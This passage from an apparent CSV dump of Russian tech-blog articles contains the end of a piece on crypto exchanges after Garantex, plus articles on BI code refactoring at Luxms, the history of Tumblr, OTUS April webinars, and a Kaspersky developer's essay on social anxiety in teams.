с акцентом на безопасность и верификацию, вроде Matbea. В условиях повышенного внимания регуляторов этот фактор становится критически важным.И всегда помните, что после закрытия Garantex особенно важно обращать внимание на репутацию и меры безопасности платформ. При выборе сервиса учитывайте не только комиссии и курсы обмена, но и уровень защиты пользователей, прозрачность операций и соблюдение регуляторных требований.А вы уже нашли альтернативу Garantex? Какими платформами пользуетесь для вывода криптовалюты в рубли? Поделитесь своим опытом в комментариях, думаю, многим будет интересно почитать.Приятного и безопасного криптотрейдинга! :)"
13,Рефакторинг в BI-проектах: когда и зачем переписывать «рабочий» код,Luxms BI,Компания,0,"Веб-разработка, Программное обеспечение",2025-04-10,"Команда авторов ГК Luxms, вендора платформы бизнес-аналитики Luxms BI: Александр Тютюнник — директор по развитию бизнесаДмитрий Дорофеев — главный конструкторИлья Гурешидзе @IlyaGureshidze — тимлид фронтенд-командыКонстантин Буров — тимлид команды аналитиковВ крупных федеральных организациях всё активнее используется подход управления на основе данных, который требует активного использования и постоянной переделки, развития, модификации аналитических приложений, отчётов, данных. Тот опыт и наши наработки, которыми мы хотим поделиться в рамках данной статьи, приносят пользу на многих проектах, где речь идёт о сотнях аналитических отчётов и дэшбордов, нескольких тысячах показателей и сотнях и тысячах активных пользователей, где, самое главное, вендорские решения кастомизируются внутренними командами заказчика. Для таких случаев всё, о чём мы расскажем дальше, очень важно, для остальных — надеемся, что будут полезны отдельные мысли и технические решения.Начнём с простого и наболевшего. Когда создаётся первая версия дэшборда, задача звучит просто: «показать данные хоть как-нибудь и побыстрее». Не до архитектуры, не до производительности — главное, чтобы цифры появились, и руководство смогло принять правильное управленческое решение. Потом уточняется задача, добавляются новые требования, меняются источники, добавляются разрезы данных, растёт нагрузка. И вот тот самый дэшборд, собранный на скорую руку, оказывается в проде — и технически работает не так и не с той скоростью, как нужно. А далее необходимо развивать функционал, обновлять версию. И сложности растут.В статье расскажем, почему так происходит и почему «оптимизация» — это не про критику, а про работу с реальностью, со сложной реальностью мира IT и мира данных. А еще — почему важно не только чинить, но и уважать чужой код. Оптимизация BI-приложений — это не магия, а просто другой этап сложного IT-проекта в области данных. Большинство «кривых» решений появляются из-за вполне понятных ограничений. Делать сразу идеально — невозможно.Подвиги разработки: когда скорость важнее архитектуры  Представьте, в понедельник — срочный показ для руководства. Команда на ушах, все бросаются что-то делать, естественно, переработки, экстренные запросы вендору. Главное — чтобы к моменту демонстрации всё работало. В таком режиме архитектура и долгосрочные последствия отходят на второй план, если хоть какой-то подход срабатывает — его используют. Здесь не до качественного тестирования и работы «как в книжках описано» — дедлайны горят.Такой код создается «на один раз». Никто не думает о том, что будет через месяц, когда он попадёт в прод и начнёт взаимодействовать с другим кодом, который ещё может даже не написан. После успешного показа — эйфория. Команда молодцы, цель достигнута. Подвиг совершён! Мало кто хочет заниматься рефакторингом, ведь всё работает. Через месяц — новый показ, новый подвиг. Очередные костыли, и снова команда — герои. Но когда таких подвигов становится слишком много, они начинают пересекаться. Один костыль ломает другой, вендор выкатывает новую версию платформы, и вдруг — подвиг невозможен. Почему всё работало, а теперь нет? Они же делают всё «как раньше»!Мы часто сталкиваемся с тем, что у клиента что-то «тормозит» или работает не так, как задумано. Идём разбираться — а там сложные селекты, тяжёлые джойны, неверная логика. Всё сделано, мягко говоря, неоптимально. Мы оптимизируем, ускоряем, клиент благодарен. Думаете, дело в том, что кто-то не знает, как правильно делать? Нет.Почти все проекты с данными проходят через это. Даже если работают опытные разработчики. Даже если проект изначально делался «по уму». Тут важно понимать, «оптимизаторы» пришли в момент, когда можно и нужно было всё улучшить. А команда, которая делала проект, работала в условиях дедлайнов и иногда полной неопределённости:Нет нормального ТЗ. Или есть, но на половину состоит из готовых таблиц в базе — “и так понятно”;Источники данных плавают. Сегодня Excel, завтра в PostgreSQL, послезавтра что-то ещё;Бизнес ещё сам не понимает, какие метрики нужны. Через неделю всё поменяется;Команда в стрессе. Жёсткие дедлайны. Главное — чтобы работало. О каком ревью речь?И, конечно, вопрос производительности вообще не стоит. Он появится позже.В этих условиях возникает «компромиссный» код. Да, он неидеален. Да, он тяжёлый, монолитный, местами страшненький. Но он работает. И он появился за два дня, а не за две недели. Вывод: подвигов не избежать, но их последствия можно минимизировать. Главное — вовремя вернуться и навести порядок.  Два аспекта — психологический и технический, — а решение одно  Психологический —  команда, которая не раз добивалась успеха, вдруг терпит неудачу, хотя делает всё «как обычно». Это вызывает раздражение и недоумение. Ведь если раньше работало, а теперь нет, — значит, кто-то испортил ситуацию. Возможно, вендор (но это не точно). Технический — в нормальном процессе есть обязательные этапы — тестирование, код-ревью, архитектурный контроль. Но в режиме подвига эти шаги пропускаются, а результат закономерен.Однако полностью отказаться от подвигов нельзя — они неизбежны. Хорошо, что платформа позволяет быстро адаптироваться. Например, хэкнуть Windows или Microsoft Office вряд ли получится, а Luxms BI можно, платформа очень гибкая.Главное — всегда возвращаться и понимать, что единой работающей системы не будет, если каждый раз не проходить все правильные процессы и процедуры IT-производства. После подвига не просто выдохнуть и праздновать успех, а выполнить пропущенные шаги:Полноценное тестирование;Код-ревью;Рефакторинг кода и/или его оптимизация;Документирование;Информирование команды о технических изменениях.Код-ревью: не про красоту, а про совместимость  Код-ревью в данном контексте — это не про обучение стилю, это не про поиск ошибок и не про оценку качества кода с точки зрения «красоты». Это инструмент, который позволяет вендору дать рекомендации, объяснить, какие методы лучше заменить, какие подходы стоит пересмотреть, чтобы код продолжал работать в будущем.  Это не тренировка, а практическая необходимость.Основная цель — проверка кода на совместимость с текущими и запланированными изменениями платформы. У вендора есть своя дорожная карта, стратегия развития продукта, идеи по улучшению кодовой базы. Какие-то части кода планируется развивать, какие-то — наоборот, исключать как устаревшие или неудобные. Эти вещи даже не всегда отражены в документации, но они критически важны для долгосрочной работоспособности системы.Поэтому наша команда в рамках технического аккаунт-менеджмента проводит аудит кода с фокусом на его совместимость с коробочным решением вендора и его будущими версиями. Параллельно команда заказчика и сама может (и должна!) проводить код-ревью с точки зрения совместимости с уже существующими своими кастомными разработками. Ведь у заказчика могут быть свои внутренние стандарты, стайл-гайды, библиотеки кастомных компонентов, специфические темы оформления. Вендор не знает о них, но они могут существенно повлиять на стабильность и поддержку системы в будущем.Две команды могут объединить усилия, дополнив пропущенные шаги в разработке, чтобы избежать проблем в перспективе. Систематическое игнорирование таких проверок приведёт к тому, что очередной «подвиг» по доработке системы станет невозможным или крайне болезненным.В мировой практике давно используются методы совместной разработки, включая конференции, открытые репозитории кода и совместное написание программных решений. Открытые форумы, митапы и другие форматы обсуждения позволяют не просто обмениваться общими идеями, но буквально разбирать код построчно, анализируя и оптимизируя решения.Лучшие практики совместной разработки применяются уже десятилетиями, как в open-source проектах (PostgreSQL и другие), так и в коммерческом ПО.Оптимизация и проектная поддержка  Разработка кастомных решений часто связана с необходимостью оптимизации. Однако важно понимать, что подходы к улучшению производительности могут быть разными.Пример: команда заказчика замечает, что дэшборд медленно загружается, и предполагает, что проблема в JavaScript. Разработчики приходят к специалисту, и он ускоряет JavaScript-код в 2 раза. Вроде бы задача решена.Но можно рассмотреть эту проблему комплексно. В команде вендора есть специалисты разного профиля — дата инженеры, фронтент и бекенд-разработчики, техподдержка.Они могут проанализировать не только код, но и архитектуру решения в целом. Оказывается, что вместо ускорения JavaScript в 2 раза можно оптимизировать обработку данных и ускорить работу в 100 раз, устранив проблему на более глубоком уровне.Есть и ещё момент: команда вендора уже сделала несколько сотен проектов, и может сравнивать один с другим. Например, если у всех запросы выполняются за полсекунды, а у конкретного заказчика — за 30 секунд, это аномалия. Клиент может этого не замечать, потому что не видел другого примера работы, но вендор-то видел, он может выявить узкие места и предложить решения.Комплексное сопровождение проекта включает:поддержку всего кода, в том числе ETL и кастомных решений;анализ влияния изменений после обновления системы;обеспечение целостности продукта в процессе его развития.Таким образом, в рамках вендорского сопровождения проекта заказчик получает не просто локальные исправления кода, а целостный подход к решению проблемы, что позволяет добиться максимальной производительности и устойчивости системы.Кстати, часто заказчики сами находят новые подходы, которые мы не предусматривали. Если они грамотно вписываются в архитектуру, мы берём их на вооружение и распространяем среди всех пользователей. Это напоминает open-source: сообщество помогает улучшать продукт.Документация и внутренняя инженерная память  Одно из главных условий устойчивого развития кода — наличие понятной, актуальной документации. Сложные системы редко разваливаются из-за багов — гораздо чаще причиной становится потеря контекста. Кто-то ушёл из команды, кто-то «написал быстро и потом забыл», кто-то добавил особенное поведение без комментариев, полагаясь на то, что «и так понятно». Через полгода становится совсем непонятно. Именно поэтому мы всё чаще говорим не только о коде, но и о внутренней инженерной памяти. Даже сильная архитектура со временем начинает «трещать», если её сопровождают только фрагментарные комментарии в стиле // костыль, не трогать.Важно фиксировать не только что делает код, но и почему он делает это именно так. Особенно когда речь идёт о нестандартных решениях, работе с кастомным LPE, обходах ограничений, асинхронной логике или взаимодействии между несколькими слоями системы. У каждого такого решения должна быть своя «анатомия»: что было до, зачем понадобилось менять, что пробовали, на чём остановились, и какие риски это в себе несёт.Чтобы не терять эти знания, необходимо создавать:Краткие описания к ключевым техническим решениям — фиксируем суть подхода, особенности реализации и важные нюансы, на которые стоит обратить внимание при повторном использовании или доработке;Методические материалы по развитию внутренних компонентов — описываем принятые практики: как структурировать код, как работать с переменными, как управлять доступами, каких подходов стоит избегать и т.д.;Сборник кейсов из практики — документируем, как мы решали конкретные задачи, какие трудности возникали, какие подходы оказались эффективными, а какие — нет.Кроме документации к коду, важны и более широкие методические материалы: гайды по архитектуре, правила написания кастомных компонентов, типовые ошибки при работе с LPE, рекомендации по работе с правами и конфигурациями. Это помогает не только ускорять разработку, но и формирует общее инженерное поле — когда каждый следующий шаг строится на понятной и уже проверенной базе. Это не формальность. Это способ защищать себя в будущем от хаоса. Он позволяет быстрее вводить новых людей, смелее рефакторить, видеть, как работает система.Разумный рефакторинг: как мы переписали логику для высокой производительностиВ одном из наших проектов данные изначально хранились в PostgreSQL. На определённом этапе было принято решение перейти на Greenplum — решение класса MPP, более подходящее для анализа больших объёмов данных.Этап 1. Перенос на Greenplum: функциональная адаптацияУ Greenplum и PostgreSQL есть ряд отличий, особенно в поддержке SQL-синтаксиса и оптимизации запросов. На первом этапе задача была не ускорять, а обеспечить корректную работу на новой СУБД.Что пришлось изменить:Переписаны SQL-запросы, использовавшие конструкции, не поддерживаемые Greenplum. Например, в PostgreSQL активно использовался INSERT ... ON CONFLICT ... DO UPDATE — удобный способ делать upsert. Однако Greenplum такую конструкцию не поддерживает из-за своей распределённой архитектуры;Упрощены участки логики, завязанные на специфичные для PostgreSQL особенности;Перепроверена корректность агрегаций и расчётов после миграции.На этом этапе приоритетом была функциональная совместимость — важно было, чтобы дэшборды продолжили работать корректно.Этап 2. Оптимизация под реальные объёмыНа этом этапе оказалось, что объём данных существенно вырос по сравнению с тестовой средой. Это привело к резкому увеличению времени расчётов.Основные проблемы:Одним из источников данных была сверхбольшая таблица, к которой шло множество запросов при расчётах;Последовательность вычислений была неэффективной;Объём промежуточных данных значительно вырос, что сильно увеличило требования к ресурсам.Что сделали:В расчётах использовали временную таблицу, куда подгружали часть данных из большого источника. Таблица хранилась в оперативной памяти, что значительно ускорило расчёты.Перестроили последовательность вычислений, оптимизировали алгоритмы обработки: порядок расчётов по сущностям исходя из понимания базы.Результат:Скорость выполнения запросов выросла более чем в 10 раз (с часов до нескольких минут);Повысилась стабильность выполнения запросов даже под высокой нагрузкой.Развитие системы и управление изменениямиНаша платформа постоянно развивается, компоненты системы эволюционируют. Однако новый функционал также не выходит сразу в идеальном виде — он проходит несколько итераций, получает доработки на основе обратной связи. Это нормальный процесс.Мы предупреждаем клиентов: если кастомный код использует новые возможности, это дополнительная зона для код-ревью, тестирования и мониторинга. Luxms BI — живой продукт.Большинство изменений происходит незаметно для пользователей. Однако если клиент использует кастомный код, который напрямую взаимодействует с конфигом, могут возникнуть нюансы. Например, если система начала писать настройки в новом формате, а кастомный код использует старый, это может привести к нестыковкам. Мы стремимся минимизировать влияние таких изменений, но отказ от устаревших решений — естественная часть развития системы: свой код мы также постоянно рефакторим и улучшаем.Оптимизация кода и архитектурные улучшения в Luxms BIОдин из кейсов по оптимизации кода внутри Luxms BI связан с компонентом VizelTabs. Этот компонент реализует логику визеля-контейнера, в котором дочерние компоненты рендерятся в зависимости от того, какая вкладка открыта.Компонент очень старый, видны следы работы разных разработчиков (некоторые из них уже даже не работают в команде), и это хорошо видно по структуре кода — фрагменты логики накладывались ситуативно, поверх уже существующего функционала, и код не просто спагеттизировался, но и вился в дреды.Компонент в какой-то момент начал получать настройки, рассчитанные внутри lpe-выражений. Стал реагировать на смену URL и даже фильтров. Появилась однотипная логика для условно-скрытых вкладок, их заголовков.Особенность этого компонента ещё и в том, что дочерние элементы — это не реальные дэши, а просто явно указанный перечень JSON-конфигов визелей. Они наследуют права родителя в виде Вкладки и Доски.В какой-то момент количество различных if-ов достигло критической массы.Мы всё чаще сталкивались с ситуацией, когда поведение компонентов зависело от логики, рассчитанной через LPE, и быстро меняющегося контекста, который нужно пересчитывать в lpe выражениях. В результате приходилось вручную подписываться на множество различных сервисов и следить за изменениями их моделей — это важно для правильного расчета контекста lpe и корректного поведения компонентов, в частности вкладок. Со временем такая система подписок превратилась в настоящий архитектурный ад.Было принято решение реализовать иной подход к наблюдению за меняющимся контекстом lpe — так называемые LPE-стримы. Это сложная система на основе промисов, которая хранит все компоненты-подписчики, чей lpe использует сервисы или переменные what-if, от значения которых зависит расчёт соответствующего контекста. Как только модель загружает данные, выходит из состояния loading и завершает обновления, система оповещает: контекст изменился, пора пересчитать значения.Такой подход стал применяться не только для компонента VizelTabs — он постепенно распространяется на всё большее число коробочных элементов. Это позволяет выстраивать более предсказуемую событийную архитектуру.Сам компонент VizelTabs был переписан: его размер стал меньше, функции — переиспользуемыми, а логика подписки на смену табов и расчет свойств hidden (видна ли вкладка) и title (название вкладки) реализованы через LPE-стримы. Также в компоненте появилась возможность использовать функции из lpeForReact — вместо строки можно писать результат связки React-нод через встроенные функции, такие как img, svg, wrap и других.Кроме того, для обратной совместимости сохранена поддержка children, но ранее фиктивные дэши теперь превращаются в настоящие. Это значит, что для них можно задавать собственную ролевую логику, отличную от родителя.Вместо морали —  немного эмпатииКогда мы приходим на проект «оптимизировать», мы находимся в лучшей позиции: Уже есть все данные;Понятны бизнес-требования;Видны типовые сценарии использования;Есть профили нагрузки;Фокус на улучшение, а не на «собери хоть что-нибудь к утру».Писать книгу с чистого листа — одна задача, а редактировать — другая. Конечно, во втором случае видно ошибки, несогласованности, можно предложить лучшие формулировки. Но это другая фаза работы!Сказать «здесь всё неправильно» — легко. Гораздо сложнее — уважать работу, сделанную в других условиях, и помочь её улучшить.Если вы — тот, кто собирает первую версию, — не стыдитесь черновиков. Не бойтесь «некрасивого» кода. Это часть жизни проекта. Просто важно помнить, что рано или поздно придёт следующая стадия. И к этому надо быть готовыми: оставить документацию, подумать о расширяемости, предусмотреть возможные изменения.Проекты с данными — это не гонка на 100 метров. Это длинная дистанция. С остановками, передышками, переосмыслением и вторым дыханием. И каждый этап здесь важен. И первый, и последний.Хорошая система — это не та, где сразу всё сделано идеально. Это та, которая способна адаптироваться, улучшаться и справляться с ростом требований. Именно поэтому в BI-проектах важно не просто «сделать красиво», а выстроить процесс развития. Шаг за шагом."
14,"А вы и не ждали: взлет, падение и возвращение Tumblr",Online patent,Ваш личный патентный офис,0,"Консалтинг и поддержка, Веб-сервисы",2025-04-10,"Сервис Tumblr позволяет делиться всеми видами контента — видео, изображениями, музыкой, текстом. Платформа существует с 2007 года и за свою историю столкнулась со множеством трудностей. Рассказываем, как со временем менялась площадка, что она представляла собой изначально и чем является сейчас. Идея и возникновение К моменту основания Tumblr в 2007 году уже были широко известны такие платформы для общения и обмена контентом, как Myspace или YouTube. Но 21-летний Дэвид Карп захотел создать им альтернативу. Он хотел сделать более дружелюбное сообщество. Кроме того, его не устраивало обилие рекламы на других платформах — Дэвид считал, что это плохо сказывается на креативности пользователей. В итоге платформа сознательно была лишена возможности оставлять комментарии или ставить негативные оценки. Вместо этого можно было сделать репост записи, и только тогда добавить к ней свой комментарий, написать письмо автору или поставить «сердечко». Даже идея подписки на пользователей появилась далеко не сразу.Сам Дэвид Карп начал изучать язык HTML еще в 11 лет, а в 15 бросил школу — так ему не терпелось создать собственную компанию. Однако не все шло так быстро и успешно, как хотелось молодому энтузиасту. Когда ему было 19, он увлекся идеей «тамбелогов» — коротких постов на самые разные темы. Именно их существование привело к созданию полноценной платформы, конкретно для этого формата обмена контентом. Успех без прибыли Через две недели после запуска Tumblr насчитывал 75 тысяч пользователей. Уже к концу 2007 года платформа смогла привлечь инвесторов и ее оценили в 3 млн долларов. Со спонсированием Дэвиду помог друг семьи. На одном из этапов Карп продал 25% акций компании за 750 тысяч долларов. Поговаривают, что он мог бы получить больше, но основатель решил, что это наложит на него слишком серьезные обязательства. Площадка стремительно развивалась — за 5 лет в Tumblr появилось более 70 миллионов блогов, в том числе от Леди Гаги и Барака Обамы. Во многом популярность была обусловлена интересом СМИ к новому и необычному решению, что привело к созданию множества разнообразных сообществ и объединений. Например, вокруг популярных (или не очень) фильмов и книг. Развитие Tumblr происходило стремительно и не требовало значительных усилий. Даже при миллионной аудитории им управляли всего 4 человека! Хотя большинство пользователей в 2012 году публиковали на площадке посты не менее 20 раз за месяц. В 2011 году Дэвид привлек 40 млн долларов инвестиций от венчурных фондов. При этом он всегда видел свою сеть как альтернативу платформам с высокой монетизацией и, следовательно, с меньшим количеством рекламы.Каким бы значительным ни был успех Tumblr, к 2012 году компания так и не стала прибыльной. Поэтому в том же году на сервисе все-таки появилась реклама. До 2012 года Tumblr зарабатывал только на том, что предоставлял возможность создавать визуальные оформления для блогов. На платформе появилось более 50 книг — в них пользователи преобразовывали свои страницы. Ряд таких страниц даже попадали в телеэфир. От этого площадка тоже получала доход.В 2013 году у платформы появился новый владелец — Yahoo!. Он сразу же заверил пользователей, что покупка Tumblr не повлияет на их анонимность и свободу. Корпорация приобрела платформу за 1,1 млрд долларов. Прирост числа пользователейВ 2014 году был довольно сильный прирост пользователей, но потом он все сильнее снижался вплоть до 2022 года. Источник: https://contentdetector.ai/Дэвид Карп остался гендиректором, а также лично получил 253 млн долларов с продажи своего детища. Yahoo! владели платформой до 2017 года, так и не сумев найти способ сделать ее прибыльной без активного привлечения рекламодателей. Среди пользователей платформа имела не самую хорошую репутацию. На нее попадал контент, который не мог найти место на других ресурсах. Кроме того, около 10% занимал контент для взрослых.Verizon, Automattic и ограничения и падение капитализацииВ 2017 году Verizon купил корпорацию Yahoo, куда входил и Tumblr. Платформа при этом была оценена вдвое дешевле, чем в 2012 году. Уже в 2018 году в сети оказался запрещен любой контент для взрослых. Ранее через Tumblr нелегально распространяли в том числе детскую порнографию — из-за этого платформа удалили из App Store. Алгоритмы фильтрации работали, но не справлялись с распознаванием такого контента. Аудитория Tumblr (млн пользователей)Как бы плохо ни обстояли дела с финансами в период с 2012 по 2017 год, количество блогов росло, снизившись только в 2024 году. Источник: https://www.demandsage.com/Очень быстро, уже в 2019 году, от Tumblr избавились — продали Automattic всего за 3 млн долларов. Именно в такую стоимость компанию оценили при запуске в далеком 2007 году. При новых владельцах, которым также принадлежит WordPress, популярность Tumblr немного восстановилась, но вложенных усилий он так и не оправдал. ПерспективыСейчас в Tumblr почти 2500 сотрудников, а каждый день публикуется более 12 млн постов. Аудитория на 40% состоит из поколения Z и на 30% — из миллениалов. Треть пользователей используют платформу каждый день, а почти 90% — каждый месяц. У Tumblr может появиться возможность активно развиваться в условиях, когда свобода слова в интернете, в том числе в США, ограничена. Один из главных конкурентов —  платформа X (ранее — Twitter) под управлением Илона Маска — сталкивается с большим негодованием со стороны собственной некогда лояльной аудитории, и Tumblr может оказаться для них очень подходящим местом. Бесплатный поиск, мониторинг и регистрация товарных знаков  и других объектов интеллектуальной собственности.Поиск по программам для ЭВМРегистрация программы для ЭВМ "
15,"12 событий апреля, которые нельзя пропустить",OTUS,Цифровые навыки от ведущих экспертов,0,"Консалтинг и поддержка, Рекрутинг и HR, Производство мультимедиа-контента",2025-04-10,"Что ждёт в апрелеAI агенты на основе LLM: что нас ждет?Как избежать хаоса: управление содержанием и изменениями в IT-проектахAgile 2025: что поменялось и почему классический Scrum уже не работает?Машинный перевод seq2seq: и как обучить модель понимать языкиВнедрение автоматизации тестирования для QA LeadDocker в действии: как контейнеризация меняет аналитику данных?Знакомство с Apache KafkaИнтерфейсы в Golang на практикеЧат-радио на Go: брокер сообщений NATS в делеСмарт-контракты: Автоматизация и сравнение реализаций в Ethereum, TON и SolanaData Science — это проще, чем кажется!Prometheus: быстрый стартAI агенты на основе LLM: что нас ждет?Готовы узнать, как AI агенты, такие как ChatGPT и GPT-4, меняют ландшафт технологий? Этот открытый урок откроет перед вами новые горизонты! Мы расскажем о том, как LLM превращаются в виртуальных ассистентов, которые могут взаимодействовать с окружающим миром, принимать решения и выполнять множество задач. Разберем принципы создания этих агентов и взглянем на их будущее.Когда: 14 апреля в 18:00Ведущая: Мария Тихонова, Senior Data Scientist SberDevices, преподаватель ВШЭ--> Узнать про AI-агентыКак избежать хаоса: управление содержанием и изменениями в IT-проектахКаждый IT-проект сталкивается с риском хаоса, особенно, когда он изменяется на ходу. Этот вебинар поможет вам выстроить процесс управления проектом так, чтобы избежать непредсказуемых изменений и поддерживать проект в рамках. Узнаете, как эффективно фиксировать границы проекта и как правильно подходить к изменениям, если они все же неизбежны.Когда: 16 апреля в 19:00Ведущий: Сергей Ветров, сертифицированный руководитель проектов института PMI Project Manager Professional (PMP).--> Узнать, как предотвратить хаосAgile 2025: что поменялось и почему классический Scrum уже не работает?Scrum есть, но не работает. Почему? Потому что мир изменился, а старые процессы уже не обеспечивают нужной гибкости и скорости. Мы поговорим о том, почему классический Scrum не дает ожидаемых результатов и как компании адаптируются, используя более гибкие модели, такие как Kanban, Lean и OKR.Когда: 17 апреля в 20:00Ведущая: Олеся Самарова, Сертифицированный Scrum master--> Адаптировать ScrumМашинный перевод seq2seq: и как обучить модель понимать языкиХотите понять, как работают современные системы машинного перевода? На этом занятии мы разберем, как архитектура seq2seq помогает моделям «понимать» языки, и как она используется в реальных задачах перевода.Когда: 21 апреля в 20:00Ведущий: Дмитрий Гайнуллин, более 3х лет в IT-проектах, занял первое место в ASR for low-resource languages Coqui AI challenge.--> Разгадать трудности переводаВнедрение автоматизации тестирования для QA LeadАвтоматизация тестирования может значительно ускорить работу команды и повысить качество продукта, но как внедрить её правильно, чтобы не тратить время и ресурсы зря? На этом вебинаре мы поделимся 15 ключевыми тактиками внедрения автоматизации и разберем, как эффективно внедрять её на разных этапах жизненного цикла продукта.Когда: 23 апреля в 19:00Ведущий: Дмитрий Поляков, отвечает за автоматизацию тестирования, внедрение практик DevOps и техническую экспертизу QA. --> Внедрить автоматизацию с умомDocker в действии: как контейнеризация меняет аналитику данных?Готовы ускорить процессы аналитики с Docker? На этом вебинаре мы разберем, как контейнеризация упрощает управление аналитическими решениями и помогает вам быстрее развертывать ETL-пайплайны и аналитические системы.Когда: 24 апреля в 20:00Ведущий: Андрей Поляков, в бэкенд-разработке на Java более 6 лет. Сейчас в роли старшего разработчика работает над сервисами платежных систем в Unlimint.--> Ускорить аналитику с DockerЗнакомство с Apache KafkaApache Kafka — это мощная распределённая платформа для потоковой обработки данных, которая лежит в основе современных data-driven приложений. На уроке мы подробно разберем, как Kafka работает и как можно эффективно интегрировать её в свои проекты.Когда: 29 апреля в 20:00Ведущий: Евгений Непомнящий, в IT c 2006 года, разработчик в IT Sense--> Познакомиться с Apache KafkaИнтерфейсы в Golang на практикеХотите научиться эффективно применять интерфейсы в Go? На этой встрече мы на примерах разберем несколько типовых ситуаций, где использование интерфейсов помогает создавать более гибкие и масштабируемые приложения.Когда: 28 апреля в 20:00--> Освоить интерфейсы в GoЧат-радио на Go: брокер сообщений NATS в делеНа этом вебинаре мы шаг за шагом создадим групповой консольный мессенджер с использованием брокера сообщений NATS. Разберем, как наладить обмен сообщениями между пользователями, используя Go. Это отличный старт для начинающих разработчиков, которые хотят углубиться в работу с многопоточностью и каналами.Когда: 29 апреля в 20:00--> Написать свой чат с NATS на GoСмарт-контракты: Автоматизация и сравнение реализаций в Ethereum, TON и SolanaСмарт-контракты — это будущее автоматизации бизнес-процессов. Узнайте, как эти самоисполняющиеся контракты на блокчейне изменяют все от DeFi до логистики и недвижимости. На этом открытом уроке мы разберем, как работают смарт-контракты, и проведем сравнительный анализ их реализации в Ethereum, TON и Solana.Когда: 29 апреля в 20:00--> Погрузиться в Web3 и смарт-контрактыData Science — это проще, чем кажется!Хотите понять, что такое Data Science и как начать работать с машинным обучением? Присоединяйтесь к открытому уроку, где Senior Data Scientist Мария Тихонова поделится секретами и покажет, как легко войти в мир DS и ML. Узнайте, чем Data Science отличается от классического программирования, и сделайте первые шаги в этой увлекательной области.Когда: 30 апреля в 18:00--> Начать свой путь в Data Science Prometheus: быстрый стартPrometheus — это мощный инструмент для мониторинга, который помогает следить за состоянием сервисов, анализировать метрики и оперативно выявлять проблемы. Если вы хотите настроить мониторинг на серверах, следить за производительностью приложений и мгновенно реагировать на проблемы — этот вебинар для вас!Когда: 30 апреля в 20:00Ведущий: Денис Федоров, DevOps в Kaspersky Lab--> Настроить мониторинг с Prometheus"
16,Выживание социофобушка в команде: личный опыт,«Лаборатория Касперского»,"Ловим вирусы, исследуем угрозы, спасаем мир",0,Программное обеспечение,2025-04-10,"Привет! Меня зовут Станислав Иванов, я — Senior iOS Developer в команде мобильной разработки «Лаборатории Касперского». Я социофобушек. Но я разобрался, как жить с этим самодиагнозом в IT, где волей-неволей приходится существовать среди большого количества созвонов, встреч и диалогов.    Если вы из тех, кто хочет только сажать красно-черные деревья / красить кнопки / расстилать инфру / обуздывать многопоточность / варить код, а вас таскают по встречам, вынуждают светить лицом и говорить ртом (и думать: «Кто все эти люди и что они от меня хотят?») — эта статья для вас. На своем совокупном опыте, полученном в разных компаниях, объясню, зачем нужны все эти таскание/свечение/говорение и как уменьшить собственные страдания.  Кто такие социофобушки и в чем наша проблема Сам термин я подслушал в одном из докладов про шаринг знаний, и эта метафора мне очень понравилась. А почему я себя таковым считаю, хорошо покажет вот такой пример. Давным-давно, когда я еще работал в офисе, утром, выходя из дома, я застрял в лифте. Да еще и свет вырубился. Пришлось около двух часов просидеть в темном ящике метр на метр. И знаете… я прекрасно провел время :)  Но увы, всю жизнь наедине с собой не проживешь. И всю карьеру в одиночку не построишь (если у вас получилось — напишите, как вам это удалось!). Когда-то давно я представлял себе программирование как решение интересных задач — эдакий хардкодинг безо всякого контакта с людьми. Максимум — что-то через Jira друг другу сообщить. Но оказывается, в нашей профессии разговоров больше, чем социофобушкам хотелось бы.  Общение с тимлидом Для социофобушка такие встречи — самая больная тема. Прежде всего потому, что там могут случаться весьма своеобразные вещи. Загораешься, например, новой идеей, технологией или фреймворком, хочешь принести их в проект, рассказываешь тимлиду, а он в ответ: «Ага, угу, да, хорошо». И на этом все заканчивается.  В чем здесь может быть проблема?   Во-первых, тимлид мог сам, так сказать, недалеко уйти от понятия «социофобушек». Не забывайте: его грузят встречами похлеще нашего, иногда без перерывов, и ваша идея могла попасть в тот промежуток, когда руководитель просто на нуле и не имеет сил нормально во все вникнуть.  Во-вторых, есть риск, что руководитель не смог правильно оценить принесенную идею и потому не понял, что от него требуется. Чтобы такого не было, следует избегать абстрактных идей и вопросов. Чем четче будет сформулировано то, что вы хотите, тем лучше. Появилась идея? Разработайте план, как и зачем ее внедрять и как потом с ней жить, чтобы от тимлида потребовался только апрув.  Отдельная важная, можно даже сказать, ключевая, тема — one-to-one. Они действительно нужны. Но ими надо правильно пользоваться. В частности — на них надо обсуждать проблемы. В качестве иллюстрации — пример с одного из моих прошлых мест работы. И почему я оттуда ушел.  Я был разрабом, и у меня был поток тасков. Стандартная история. Они не очень интересные, но выбирать, что мне нравится, а что нет, не приходилось. Так я и сидел, решая все подряд, плавненько выгорая. Как-то появилась надежда — мол, впереди майские, там вдобавок небольшой отпуск намечается, я отдохну и вернусь выгорать с новыми силами. Как вы понимаете, план провалился: отдых прошел так себе, я вышел примерно таким же выгоревшим, как и уходил, и в первый же день мне прилетают очередные таски, от которых меня уже воротит… Так я и ушел.  Если бы я не держал все в себе и сразу начал бы подсвечивать лиду на 1-2-1 встречах, что у меня есть проблемы, что я начинаю выгорать и надо что-то менять, то, вполне возможно, все сложилось бы по-другому. Однако получилось, как получилось.  Тимлид — не психотерапевт, но это человек, который сильно заинтересован в том, чтобы команда работала эффективно. Если в рабочем процессе где-то что-то идет не так, то не стесняйтесь говорить об этом. Он — ваш первый соратник на пути к эффективной работе.  Дейлики Те самые регулярные встречи, которые проходят либо каждый день, либо раз в несколько дней.  Дейлики — замечательный способ получить обратную связь. Самостоятельно вы можете просто не заметить, что начинаете где-то закапываться. Личный пример: обожаю влезть в какой-нибудь рефакторинг! Ну нельзя же просто так взять и не сделать мир после себя лучше, правда?! Но именно на дейлике можно вовремя получить фидбэк, что пора закрывать задачу и не надо пытаться улучшить то, что и так хорошо работает.  Важный момент — есть менеджеры, которые считают, что камеру включать обязательно. Отчасти они правы, говорить с неподвижными аватарками достаточно грустно. Но мы же с вами социофобушки, которым не очень хочется привлекать к себе внимание… Здесь я нашел такой компромисс — включать камеру только в тот момент, когда говоришь сам и непосредственно что-то рассказываешь. А когда в диалоге не участвуешь, то спокойно возвращаешь аватарку.  И еще одно. К дейликам очень полезно составлять план. Предположим, с прошлого дейлика прошло 24 часа, и за это время я написал одну строчку кода. Это грустно, печально и немного угнетает, правда? Но только один я знаю, что на эту строчку кода было потрачено много времени, потому что для того, чтобы эта строчка состоялась, мне пришлось героически решать какую-то другую проблему в коде, которую я сам себе и создал. Запомните и опишите этот момент хотя бы для себя — это очень 